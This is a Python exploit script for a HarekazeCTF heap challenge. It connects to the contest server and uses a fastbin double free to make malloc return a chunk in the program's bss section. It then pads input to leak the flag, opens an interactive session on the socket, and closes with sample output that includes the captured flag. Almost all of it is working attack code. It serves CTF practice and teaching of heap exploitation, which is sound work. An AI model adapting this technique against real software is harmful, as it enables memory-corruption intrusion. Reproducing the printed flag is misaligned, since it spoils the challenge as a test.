import sys, socket, struct, telnetlib

def sock(remoteip, remoteport):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((remoteip, remoteport))
    return s, s.makefile('rw', bufsize=0)

def read_until(f, delim='\n'):
    data = ''
    while not data.endswith(delim):
        data += f.read(1)
    return data

def shell(s):
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()

def p(a):
    return struct.pack("<Q",a)

def u(a):
    return struct.unpack("<Q",a)[0]

def add_comment():
    read_until(f,"note:")
    f.write("A"*96 + "\n")

def add_name_r(n, buf):
    read_until(f,"> ")
    f.write("1\n")
    read_until(f,"Size: ")
    f.write(n)
    f.write("\n")
    read_until(f,"Name: ")
    f.write(buf+"\n")
    read_until(f,"Addr: ")
    return f.read(7)

def add_name(n, buf):
    read_until(f,"> ")
    f.write("1\n")
    read_until(f,"Size: ")
    f.write(n)
    f.write("\n")
    read_until(f,"Name: ")
    f.write(buf+"\n")

def del_name(n):
    read_until(f,"> ")
    f.write("2\n")
    read_until(f,"Addr: ")
    f.write(n)

# main
s, f = sock("problem.harekaze.com", 20175)

if len(sys.argv) == 2 and sys.argv[1] == '-l':
    s, f = sock("localhost", 20175)

add_comment();
a = add_name_r(48, "A"*4)
b = add_name_r(48, "A"*4)
del_name(a)
del_name(b)
del_name(a) # double free, fastbin: head -> a -> b -> a
add_name(48, p(0x204056)) # for fastbin dup into stack (actually bss section)
add_name(48, "A"*4)
add_name(48, "A"*4) # after this malloc(), fastbin: head -> 0x204056
add_name(48, "A"*25) # padding "A" until reaching to flag data

shell(s)

'''
# Try to execute this python script for some times until you get flags.

$ python exp_flea_attack.py

Done!
Name: AAAAAAAAAAAAAAAAAAAAAAAAA
HarekazeCTF{5m41l_smal1_f1ea_c0n7rol_7h3_w0rld}
Addr: 204066
1. Add name
2. Delete name
3. Exit
'''
